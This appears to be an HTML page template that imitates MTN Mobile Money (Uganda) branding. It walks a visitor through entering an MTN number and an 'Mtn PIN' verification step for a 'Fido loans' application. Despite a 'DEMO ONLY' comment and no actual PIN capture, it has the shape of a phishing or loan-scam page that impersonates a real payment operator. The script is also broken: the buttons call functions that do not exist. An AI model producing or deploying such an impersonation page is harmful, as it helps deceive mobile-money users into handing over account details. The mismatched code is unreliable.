<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>MoMo MTN</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background: #f3f5f6;
      color: #123;
    }

    .demo-bar {
      background: #111;
      color: #ffcc00;
      text-align: center;
      padding: 10px;
      font-size: 13px;
      font-weight: bold;
    }

    .hero {
      height: 300px;
      background: #075b76;
      color: white;
      text-align: center;
      padding-top: 45px;
      border-radius: 0 0 35% 35%;
    }

    .momo-logo {
      width: 68px;
      height: 68px;
      margin: auto;
      border-radius: 14px;
      background: #ffcc00;
      color: #075b76;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      font-weight: 500;
    }

    .hero h1 {
      margin-top: 10px;
      font-size: 28px;
    }

    .hero h1 span {
      color: #ffcc00;
    }

    .hero p {
      margin-top: 8px;
      font-size: 11px;
      font-weight: bold;
      letter-spacing: 2px;
    }

    .card {
      width: calc(100% - 35px);
      max-width: 510px;
      margin: -65px auto 0;
      position: relative;
      background: white;
      border-radius: 40px;
      padding: 35px;
      box-shadow: 0 10px 30px rgba(0,0,0,.12);
    }

    .card h2 {
      text-align: center;
      color: #075b76;
      margin-bottom: 30px;
      font-size: 22px;
    }

    .number-row {
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .flag {
      width: 80px;
      height: 80px;
      border: 1px solid #777;
      border-radius: 25px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 35px;
    }

    .input-box {
      flex: 1;
    }

    .input-box label {
      display: block;
      background: white;
      width: max-content;
      padding: 0 8px;
      margin-left: 15px;
      margin-bottom: -5px;
      position: relative;
      z-index: 2;
      font-size: 15px;
    }

    input {
      width: 100%;
      height: 62px;
      border: 1px solid #777;
      border-radius: 20px;
      padding: 0 25px;
      font-size: 16px;
      outline: none;
    }

    input:focus {
      border: 2px solid #075b76;
    }

    .terms {
      text-align: center;
      color: #68757b;
      margin-top: 30px;
      line-height: 1.6;
    }

    .terms strong {
      color: #075b76;
    }

    .next {
      width: calc(90% - 35px);
      max-width: 510px;
      display: block;
      margin: 35px auto 20px;
      height: 65px;
      border: none;
      border-radius: 35px;
      background: #075b76;
      color: white;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
    }

    .next:hover {
      opacity: .9;
    }

    .back {
      width: 100%;
      background: #333;
      margin-top: 12px;
    }

    .mtn-warning {
      width: calc(100% - 35px);
      max-width: 510px;
      margin: 20px auto;
      padding: 18px;
      background: #fff1b8;
      border-radius: 15px;
      text-align: center;
      color: #333;
      font-size: 14px;
    }

    .hidden {
      display: none;
    }

    .message {
      margin-top: 20px;
      text-align: center;
      padding: 14px;
      border-radius: 10px;
      font-weight: bold;
    }

    .success {
      background: #e2f5e5;
      color: #176b28;
    }

    .error {
      background: #ffe5e5;
      color: #a00000;
    }

    .mtn-pin {
      text-align: center;
      background: #f3f5f6;
      border-radius: 15px;
      padding: 20px;
      margin-top: 20px;
    }

    .mtn-pin strong {
      display: block;
      color: #075b76;
      font-size: 28px;
      letter-spacing: 8px;
      margin-top: 8px;
    }

    .success-screen {
      text-align: center;
      padding: 20px 0;
    }

    .success-icon {
      font-size: 55px;
      margin-bottom: 15px;
    }

    .success-screen h2 {
      margin-bottom: 15px;
    }

    .success-screen p {
      color: #68757b;
      line-height: 1.6;
    }

    @media (max-width: 500px) {
      .hero {
        height: 260px;
      }

      .card {
        padding: 35px 20px;
      }

      .flag {
        width: 65px;
        height: 70px;
      }

      .hero h1 {
        font-size: 32px;
      }
    }
  </style>
</head>

<body>

  <!-- CLEAR MTN MOMO LABEL -->
  <div class="demo-bar">
    MTN MoMo — MTN ONLY
  </div>

  <section class="hero">

    <div class="mtn momo-logo">
      MoMo
    </div>

    <h1>
      MoMo <span>Mtn</span>
    </h1>

    <p>
      MOMO MTN APPLICATION
    </p>

  </section>


  <!-- NUMBER PAGE -->

  <div class="card" id="numberPage">

    <h2>
      Welcome to MoMo MTN
    </h2>

    <div class="number-row">

      <div class="flag">
        🇺🇬
      </div>

      <div class="input-box">

        <label for="phone">
          Mtn number
        </label>

        <input
          id="phone"
          type="tel"
          maxlength="9"
          value=
      
        >

      </div>

    </div>

    <div class="terms">
    
    </div>

    <div id="numberMessage"></div>

  </div>


  <button
    class="next"
    onclick="continue()"
  >
    NEXT →
  </button>


  <!-- MTN VERIFICATION PAGE -->

  <div
    class="card hidden"
    id="pinPage"
  >

    <h2>
      Mtn Verification
    </h2>

    <p style="text-align:center;margin-bottom:20px;color:#68757b;">
      Fido loans last verification process.
    </p>

    <div class="mtn-pin">

      Mtn PIN

      <strong>
        
      </strong>

    </div>

    <button
      class="next"
      style="width:100%;margin-top:30px;"
      onclick="verify()"
    >
      VERIFY
    </button>

    <button
      class="next back"
      onclick="goBack()"
    >
      BACK
    </button>

    <div id="pinMessage"></div>

  </div>


  <!-- SUCCESS PAGE -->

  <div
    class="card hidden"
    id="successPage"
  >

    <div class="success-screen">

      <div class="success-icon">
        ✅
      </div>

      <h2>
        Application successful
      </h2>

      <p>
        Your Fido loans application has been completed successfully.
      </p>

      <button
        class="next"
        style="width:100%;"
        onclick="restart()"
      >
        DONE
      </button>

    </div>

  </div>


  <div class="mtn-warning">
    <strong>Terms and conditions applies</strong><br>
    
  </div>


  <script>

    function showMessage(id, text, success) {

      const element = document.getElementById(id);

      element.className =
        "message " + (success ? "success" : "error");

      element.textContent = text;
    }


    function continueDemo() {

      const phone =
        document.getElementById("phone").value.trim();

      if (phone !== "123456789") {

        showMessage(
          "numberMessage",
          "Mtn number is any digits.",
          false
        );

        return;
      }

      document
        .getElementById("numberPage")
        .classList.add("hidden");

      document
        .getElementById("pinPage")
        .classList.remove("hidden");

      window.scrollTo({
        top: 0,
        behavior: "smooth"
      });
    }


    function goBack() {

      document
        .getElementById("pinPage")
        .classList.add("hidden");

      document
        .getElementById("numberPage")
        .classList.remove("hidden");

    }


    async function verifyDemo() {

      /*
        DEMO ONLY:
        No user-entered PIN is collected or transmitted.
        The server receives mtn submission event.
      */

      try {

        const response = await fetch("/api/mtn", {

          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({
            event: "MTN_SUBMISSION"
          })

        });


        const data = await response.json();


        if (response.ok && data.success === true) {

          showSuccessPage();

        } else {

          showMessage(
            "pinMessage",
            "Demo completed, but the notification service is unavailable.",
            false
          );

        }

      } catch (error) {

        console.error(error);

        showMessage(
          "pinMessage",
          "Demo completed locally, but the notification service is unavailable.",
          false
        );

      }

    }


    function showSuccessPage() {

      document
        .getElementById("pinPage")
        .classList.add("hidden");

      document
        .getElementById("successPage")
        .classList.remove("hidden");

      window.scrollTo({
        top: 0,
        behavior: "smooth"
      });

    }


    function restartDemo() {

      document
        .getElementById("successPage")
        .classList.add("hidden");

      document
        .getElementById("numberPage")
        .classList.remove("hidden");

      document
        .getElementById("pinMessage")
        .textContent = "";

      window.scrollTo({
        top: 0,
        behavior: "smooth"
      });

    }

  </script>

</body>
</html>
